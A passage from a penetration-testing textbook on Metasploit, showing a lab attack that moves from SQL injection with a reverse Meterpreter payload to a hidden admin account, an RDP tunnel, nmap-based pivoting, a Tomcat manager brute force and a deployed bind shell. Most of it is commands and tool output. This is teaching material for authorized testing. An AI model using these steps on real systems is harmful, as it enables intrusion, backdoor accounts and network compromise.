compro- mised target, we launch Fast-Track. (When the <span class="s19">xterm </span>window opens, close it since we already have a listener set up.)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_691.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: justify;">[+] Importing 64kb debug bypass payload into Fast-Track... [+] [+] Import complete, formatting the payload for delivery.. [+] [+] Payload Formatting prepped and ready for launch. [+]</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[+] Executing SQL commands to elevate account permissions. [+] [+] Initiating stored procedure: &#39;xp_cmdhshell&#39; if disabled. [+] [+] Delivery Complete. [+]</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Launching MSFCLI Meterpreter Handler</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Creating Metasploit Reverse Meterpreter Payload.. Created by msfpayload (http://www.metasploit.com). Payload: windows/meterpreter/reverse_tcp</p><p class="s25" style="padding-left: 94pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Length: 290</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Options: LHOST=172.16.32.129,LPORT=443</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Taking raw binary and converting to hex. Raw binary converted to straight hex.</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[+] Bypassing Windows Debug 64KB Restrictions. Evil. [+]</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[+] Sending chunked payload. Number 1 of 9. This may take a bit. [+] [+] Sending chunked payload. Number 2 of 9. This may take a bit. [+]</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[+] Conversion from hex to binary in progress. [+]</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[+] Conversion complete. Moving the binary to an executable. [+] [+] Splitting the hex into 100 character chunks [+]</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[+] Split complete. [+]</p><p class="s25" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">[+] Prepping the payload for delivery. [+] Sending chunk 1 of 8, this may take a bit... Sending chunk 2 of 8, this may take a bit...</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Using H2B Bypass to convert our Payload to Binary.. Running cleanup before launching the payload....</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[+] Launching the PAYLOAD!! This may take up to two or three minutes. [+]</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_692.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">This should look familiar. We’ve essentially attacked the web application through Fast-Track and exploited it via SQL injection attacks. We used the <span class="s25">xp_cmdshell </span>stored procedure and the binary-to-hex conversion technique to present a full-fledged Meterpreter shell.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark454">Post Exploitation</a><a name="bookmark468">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">At this point, we should have a Meterpreter console running in the back- ground within <span class="s19">msfconsole</span>, so we can begin to scan the target’s subnet for other live systems. To do this, we’ll upload <span class="s19">nmap </span>to the target and run it from the Windows machine.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">First, download <span class="s19">nmap </span>from <span class="s19">insecure.org </span>in an executable format and save it locally. We’ll be uploading this to our target. Next, we’ll connect to the target via Microsoft’s Remote Desktop Protocol (RDP), a built-in graphical remote administration protocol that lets you interact with the Windows Desktop as if you were sitting in front of the remote machine. After we’re connected with our Meterpreter session, we’ll use the <span class="s19">getgui </span>Meterpreter script to tunnel RDP back out to us over port 8080 and add a new administrative user to the system.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">We enter <span class="s18">rdesktop localhost:8080 </span>from Back|Track’s command line, so we can log into the system with the newly created user account. We then use Meterpreter to upload <span class="s19">nmap </span>to the target. Our goal is to install <span class="s19">nmap </span>on the compromised Windows target and use the system as a staging ground for further attacks. Conversely you could use <span class="s19">scanner/portscan/syn </span>and <span class="s19">scanner/ portscan/tcp </span>to port scan directly through Metasploit. The choice is a matter of personal preference and needs.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_693.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span class="s24">run getgui -e -f 8080</span></p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a href="mailto:carlos_perez@darkoperator.com" class="s34" target="_blank">[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator [*] Carlos Perez carlos_perez@darkoperator.com</a></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Enabling Remote Desktop [*] RDP is already enabled</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Setting Terminal Services service startup mode [*] Terminal Services service is already set to auto [*] Opening port in local firewall if necessary</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Starting the port forwarding at local port 8080</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Local TCP relay created: 0.0.0.0:8080 &lt;-&gt; 127.0.0.1:3389 meterpreter &gt; <span class="s24">shell</span></p><p class="s25" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Process 2480 created.</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Channel 6 created.</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Microsoft Windows XP [Version 5.1.2600]</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">(C) Copyright 1985-2001 Microsoft Corp.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">C:\WINDOWS\system32&gt;<span class="s24">net user msf metasploit /add</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">net user msf metasploit /ADD</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">The command completed successfully. C:\WINDOWS\system32&gt;<span class="s24">net localgroup administrators msf /add </span>net localgroup administrators msf /add</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">The command completed successfully. C:\WINDOWS\system32&gt; C:\WINDOWS\system32&gt;<span class="s24">^Z</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: justify;">Background channel 6? [y/N] y meterpreter &gt; <span class="s24">upload nmap.exe</span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">[*] uploading : nmap.exe -&gt; nmap.exe [*] uploaded : nmap.exe -&gt; nmap.exe meterpreter &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_694.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">We now have our launching pad for additional attacks. With <span class="s19">nmap </span>installed on the target, we are essentially sitting on the internal network. We can now attempt to enumerate internally connected systems and further penetrate the network.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: justify;"><a name="bookmark455">Scanning the Metasploitable System</a><a name="bookmark469">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">With our Meterpreter session granting us access to the internal network via the <span class="s25">load auto_add_route </span>command, we can scan and exploit the inside hosts using the compromised Windows XP target as the launching point. We’re effectively connected to the internal network, so we should be able to reach our Metasploitable system. Let’s begin with a basic port scan.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_695.png"/></span></p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">nmap.exe -sT -A -P0 172.16.32.162</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">PORT STATE SERVICE VERSION</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">21/tcp open ftp ProFTPD 1.3.1</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">|_ftp-bounce: no banner</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">| ssh-hostkey: 1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">|_2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: justify;">23/tcp open telnet Linux telnetd 25/tcp open smtp Postfix smtpd 53/tcp open domain ISC BIND 9.4.2</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: justify;">80/tcp open http Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch)</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: justify;">|_html-title: Site doesn&#39;t have a title (text/html).</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: justify;">139/tcp open netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP) 3306/tcp open mysql MySQL 5.0.51a-3ubuntu5</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: justify;">5432/tcp open postgresql PostgreSQL DB</p><p class="s25" style="padding-top: 3pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">8009/tcp open ajp13 Apache Jserv (Protocol v1.3) 8180/tcp open http Apache Tomcat/Coyote JSP engine 1.1</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">|_html-title: Apache Tomcat/5.5</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">|_http-favicon: Apache Tomcat</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">MAC Address: 00:0C:29:39:12:B2 (VMware)</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a href="http://nmap.org/submit/" class="s34" target="_blank">No exact OS matches for host (If you know what OS is running on it, see </a>http://nmap.org/submit/ ). Network Distance: 1 hop</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Service Info: Host: metasploitable.localdomain; OSs: Unix, Linux</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Host script results:</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt;</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">| smb-os-discovery:</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">| OS: Unix (Samba 3.0.20-Debian)</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">| Name: WORKGROUP\Unknown</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">|_ System time: 2010-05-21 22:28:01 UTC-4</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;"><a href="http://nmap.org/submit/" class="s34" target="_blank">OS and Service detection performed. Please report any incorrect results at </a>http://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 60.19 seconds</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_696.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Here we see a series of open ports. Based on <span class="s19">nmap</span>’s OS detection we see that the scanned system is a UNIX/Linux variant of some sort. Some of these ports should jump out at you, such as FTP, Telnet, HTTP, SSH, Samba, MySQL, PostgreSQL, and Apache.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark456">Identifying Vulnerable Services</a><a name="bookmark470">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Because a few ports look interesting, we’ll start banner-grabbing each one to try to find a way into the system.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_697.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">use auxiliary/scanner/ftp/ftp_version</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(ftp_version) &gt; <span class="s24">set RHOSTS 172.16.32.162</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">RHOSTS =&gt; 172.16.32.162</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(ftp_version) &gt; <span class="s24">run</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] 172.16.32.162:21 FTP Banner: &#39;220 <span class="s24">ProFTPD 1.3.1 </span>Server (Debian) [::ffff:172.16.32.162]\x0d\x0a&#39; [*] Scanned 1 of 1 hosts (100% complete)</p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Auxiliary module execution completed msf auxiliary(ftp_version) &gt;</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_698.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Exiting the system, we know now that ProFTPD 1.3.1 is running on port 21. Next we use SSH to learn more about the target. (The addition of the <span class="s25">-v </span>flag gives us verbose output.) The next listing tells us that our target is running an older version of OpenSSH, specifically written for Ubuntu:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_699.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">ssh 172.16.32.162 -v</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] exec: ssh 172.16.32.162 –v</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-top: 4pt;padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">OpenSSH_5.1p1 Debian-3ubuntu1, OpenSSL 0.9.8g 19 Oct 2007</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_700.png"/></span></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Now we issue the following to determine the version of Ubuntu running on this system:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_701.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(telnet_version) &gt; <span class="s24">set RHOSTS 172.16.32.162</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">RHOSTS =&gt; 172.16.32.162</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(telnet_version) &gt; <span class="s24">run</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] 172.16.32.162:23 TELNET <span class="s24">Ubuntu 8.04</span>\x0ametasploitable login: [*] Scanned 1 of 1 hosts (100% complete)</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Auxiliary module execution completed msf auxiliary(telnet_version) &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_702.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Great! We know that the system is running Ubuntu 8.04 and that two unencrypted protocols (telnet and FTP) are in use that might come into play later.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Now let’s look at SMTP to see what version our target is running. Remem- ber that we are trying to identify the running versions of the services operat- ing on the various remote systems.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_703.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">use auxiliary/scanner/smtp/smtp_version</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(smtp_version) &gt; <span class="s24">set RHOSTS 172.16.32.162</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">RHOSTS =&gt; 172.16.32.162</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(smtp_version) &gt; <span class="s24">run</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] 172.16.32.162:25 SMTP 220 metasploitable.localdomain ESMTP <span class="s24">Postfix </span>(Ubuntu)\x0d\x0a [*] Scanned 1 of 1 hosts (100% complete)</p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Auxiliary module execution completed msf auxiliary(smtp_version) &gt;</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_704.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: justify;">As you can see, the Postfix mail server appears to be running on the Metasploitable server.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">This process is continued through all the different ports that have been discovered as listening on our target. The various auxiliary modules are very useful for this work. When you’re finished, you should have a list of the ver- sions of software running on the system, information that you will use when targeting attacks.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark457">Attacking Apache Tomcat</a><a name="bookmark471">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Now we enter the attack phase again, where we start to get our hands dirty.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">In the course of our research, we noticed a plethora of vulnerabilities on this system, including direct exploits and brute force possibilities. Now, if we were performing an overt penetration test, we could run vulnerability scanners against the system to find most openings for us, but that would take all the fun out of it! Let’s attack Apache instead.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">We notice that Apache Tomcat is installed on port 8180, as shown in our earlier port scans. After a bit of Internet research, we learn that Tomcat is vulnerable to a management interface brute force attack. (In most cases, we can use <span class="s19">exploit-db </span>or Google to identify potential vulnerabilities in a given</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">service.) After some more research on the operating version number of the Apache Tomcat installation running on the target, the Tomcat manager seemed the best route for compromising the system. If we can get through Tomcat’s manager function, we can use the HTTP <span class="s25">PUT </span>method to deploy our payload on the vulnerable system. We launch the attack as follows (with the list of exploits and payloads snipped):</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_705.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">search apache</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Searching loaded modules for pattern &#39;apache&#39;...</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(tomcat_mgr_login) &gt; <span class="s24">set RHOSTS 172.16.32.162</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">RHOSTS =&gt; 172.16.32.162</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">smsf auxiliary(tomcat_mgr_login) &gt; <span class="s24">set THREADS 50</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">THREADS =&gt; 50</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(tomcat_mgr_login) &gt; <span class="s24">set RPORT 8180</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">RPORT =&gt; 8180</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(tomcat_mgr_login) &gt; <span class="s24">set VERBOSE false</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">VERBOSE =&gt; false</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">emsf auxiliary(tomcat_mgr_login) &gt; <span class="s24">run</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 87%;text-align: justify;">[+] http://172.16.32.162:8180/manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] successful login &#39;tomcat&#39; : &#39;tomcat&#39;</p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: justify;">[*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf auxiliary(tomcat_mgr_login) &gt;</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_706.png"/></span></p><p style="padding-top: 7pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">Our brute force attack is successful, and it logs in with the username</p><p class="s19" style="padding-left: 90pt;text-indent: 0pt;line-height: 12pt;text-align: left;">tomcat <span class="p">and password </span>tomcat<span class="p">. But we don’t yet have a shell.</span></p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">With our newly discovered credentials, we leverage Apache’s HTTP <span class="s25">PUT </span>functionality with the <span class="s19">multi/http/tomcat_mgr_deploy </span>exploit to place our pay- load on the system using the valid username and password that we discovered by brute-forcing the login.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_707.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">auxiliary(tomcat_mgr_login) &gt; <span class="s24">use multi/http/tomcat_mgr_deploy</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(tomcat_mgr_deploy) &gt; <span class="s24">set password tomcat</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">password =&gt; tomcat</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(tomcat_mgr_deploy) &gt; <span class="s24">set username tomcat</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">username =&gt; tomcat</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(tomcat_mgr_deploy) &gt; <span class="s24">set RHOST 172.16.32.162</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">RHOST =&gt; 172.16.32.162</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(tomcat_mgr_deploy) &gt; <span class="s24">set LPORT 9999</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">LPORT =&gt; 9999</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Msf exploit(tomcat_mgr_deploy) &gt; <span class="s24">set RPORT 8180</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">RPORT =&gt; 8180</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(tomcat_mgr_deploy) &gt; <span class="s24">set payload linux/x86/shell_bind_tcp</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">payload =&gt; linux/x86/shell_bind_tcp</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(tomcat_mgr_deploy) &gt; <span class="s24">exploit</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Using manually select target &quot;Linux X86&quot;</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Uploading 1669 bytes as FW36owipzcnHeUyIUaX.war ... [*] Started bind handler</p><p class="s25" style="padding-top: 3pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Executing /FW36owipzcnHeUyIUaX/UGMIdfFjVENQOp4VveswTlma.jsp... [*] Undeploying FW36owipzcnHeUyIUaX ...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Command shell session 1 opened (172.16.32.129:43474 -&gt; 172.16.32.162:9999) at 2010-05-</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">21 23:57:47 -0400msf</p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">ls <span class="s25">bin boot cdrom dev etc home</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">initrd initrd.img lib lost+found media</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">mnt opt proc root sbin srv sys tmp usr var</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">vmlinuz <span class="s24">whoami </span>tomcat55 <span class="s24">ls /root</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">reset_logs.sh</p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">mkdir /root/moo.txt</p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">mkdir: cannot create directory &#39;/root/moo.txt&#39;: Permission denied</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_708.png"/></span></p><p style="padding-top: 